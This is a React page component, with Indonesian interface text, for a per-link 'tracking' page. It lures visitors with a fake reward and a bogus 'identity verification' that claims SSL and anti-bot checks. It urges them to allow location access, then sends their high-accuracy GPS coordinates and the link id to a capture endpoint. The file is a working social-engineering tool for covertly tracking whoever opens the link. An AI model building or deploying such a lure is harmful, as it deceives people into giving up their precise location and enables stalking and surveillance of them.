'use client';

import { useState, use } from 'react';

export default function TrackingPage({ params }: { params: Promise<{ id: string }> }) {
    const unwrappedParams = use(params);
    const { id } = unwrappedParams;

    const [status, setStatus] = useState<'idle' | 'requesting' | 'success' | 'error'>('idle');

    const captureLocation = () => {
        setStatus('requesting');

        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    try {
                        await fetch('/api/track/capture', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                linkId: id,
                                lat: position.coords.latitude,
                                lng: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                            }),
                        });
                        setStatus('success');
                    } catch {
                        console.error('Failed to send location');
                        setStatus('error');
                    }
                },
                (error) => {
                    console.error('Geolocation error:', error);
                    setStatus('error');
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        } else {
            setStatus('error');
        }
    };



    return (
        <div style={{
            minHeight: '100vh',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            backgroundColor: 'var(--bg-color)',
            backgroundImage: 'radial-gradient(circle at 15% 50%, rgba(0, 240, 255, 0.05), transparent 25%), radial-gradient(circle at 85% 30%, rgba(138, 43, 226, 0.06), transparent 25%)',
            color: 'var(--text-primary)',
            padding: '20px'
        }}>
            <div className="glass-card animate-fade-in" style={{
                maxWidth: '440px',
                width: '100%',
                textAlign: 'center',
                padding: '40px 32px'
            }}>

                <div style={{ marginBottom: '24px', display: 'flex', justifyContent: 'center' }}>
                    <div style={{
                        width: '80px', height: '80px',
                        borderRadius: '20px',
                        background: 'linear-gradient(135deg, rgba(0,240,255,0.1), rgba(138,43,226,0.1))',
                        border: '1px solid rgba(255,255,255,0.1)',
                        display: 'flex', alignItems: 'center', justifyContent: 'center',
                        fontSize: '40px',
                        boxShadow: '0 8px 32px rgba(0,0,0,0.3), inset 0 2px 0 rgba(255,255,255,0.2)'
                    }}>
                        {status === 'idle' ? '🎁' : status === 'success' ? '✅' : status === 'error' ? '❌' : '🔒'}
                    </div>
                </div>

                {status === 'idle' && (
                    <div className="animate-fade-in stagger-1">
                        <h1 className="heading" style={{ fontSize: '28px', marginBottom: '12px' }}>
                            Verifikasi Identitas
                        </h1>
                        <p className="subheading" style={{ fontSize: '15px', marginBottom: '32px', marginInline: 'auto' }}>
                            Sistem keamanan kami memerlukan otentikasi lokasi sebelum Anda dapat mengklaim reward ini.
                        </p>

                        <div style={{ background: 'rgba(0,0,0,0.3)', borderRadius: '12px', padding: '16px', marginBottom: '32px', border: '1px solid rgba(255,255,255,0.05)', textAlign: 'left' }}>
                            <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '12px' }}>
                                <span style={{ color: 'var(--accent-cyan)' }}>✓</span>
                                <span style={{ fontSize: '14px', color: '#e6edf3' }}>Koneksi terenkripsi (SSL 256-bit)</span>
                            </div>
                            <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                                <span style={{ color: 'var(--accent-cyan)' }}>✓</span>
                                <span style={{ fontSize: '14px', color: '#e6edf3' }}>Verifikasi anti-bot otomatis</span>
                            </div>
                        </div>

                        <button
                            onClick={captureLocation}
                            className="btn-primary"
                            style={{ width: '100%', height: '54px', fontSize: '16px' }}
                        >
                            Lanjutkan Verifikasi
                        </button>
                        <p style={{ marginTop: '20px', fontSize: '13px', color: 'var(--text-secondary)' }}>
                            Tekan <strong style={{ color: '#fff' }}>"Allow"</strong> atau <strong style={{ color: '#fff' }}>"Izinkan"</strong> bila muncul prompt di layar Anda.
                        </p>
                    </div>
                )}

                {status === 'requesting' && (
                    <div className="animate-fade-in">
                        <div style={{ marginBottom: '24px', display: 'flex', justifyContent: 'center' }}>
                            <div style={{
                                width: '48px', height: '48px',
                                border: '3px solid rgba(255,255,255,0.1)',
                                borderTop: '3px solid var(--accent-cyan)',
                                borderRadius: '50%',
                                animation: 'spin 1s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite'
                            }} />
                            <style>{`@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`}</style>
                        </div>
                        <h2 style={{ fontSize: '22px', fontWeight: 'bold', color: '#fff', marginBottom: '8px' }}>Sinkronisasi Data...</h2>
                        <p style={{ color: 'var(--text-secondary)', fontSize: '15px' }}>Menunggu respons dari satelit GPS perangkat Anda.</p>
                    </div>
                )}

                {status === 'success' && (
                    <div className="animate-fade-in">
                        <h2 className="heading" style={{ fontSize: '28px', marginBottom: '12px', color: 'var(--success-color)' }}>Terverifikasi</h2>
                        <p style={{ color: 'var(--text-secondary)', fontSize: '15px', marginBottom: '24px' }}>Identitas lokasi Anda telah berhasil dicatat oleh sistem.</p>

                        <div style={{ padding: '16px', borderRadius: '12px', background: 'rgba(46, 160, 67, 0.1)', border: '1px solid rgba(46, 160, 67, 0.2)' }}>
                            <p style={{ color: '#4ade80', fontSize: '14px', fontWeight: '500' }}>Anda sekarang dapat menutup halaman ini.</p>
                        </div>
                    </div>
                )}

                {status === 'error' && (
                    <div className="animate-fade-in">
                        <h2 style={{ fontSize: '24px', fontWeight: 'bold', color: 'var(--error-color)', marginBottom: '12px' }}>Akses Ditolak</h2>
                        <p style={{ color: 'var(--text-secondary)', fontSize: '15px', marginBottom: '32px' }}>
                            Verifikasi gagal. Anda mungkin menolak izin lokasi atau sinyal GPS tidak ditemukan. Sistem menganggap Anda sebagai bot.
                        </p>
                        <button
                            onClick={captureLocation}
                            className="btn-secondary"
                            style={{ width: '100%' }}
                        >
                            Coba Verifikasi Ulang
                        </button>
                    </div>
                )}

            </div>
        </div>
    );
}
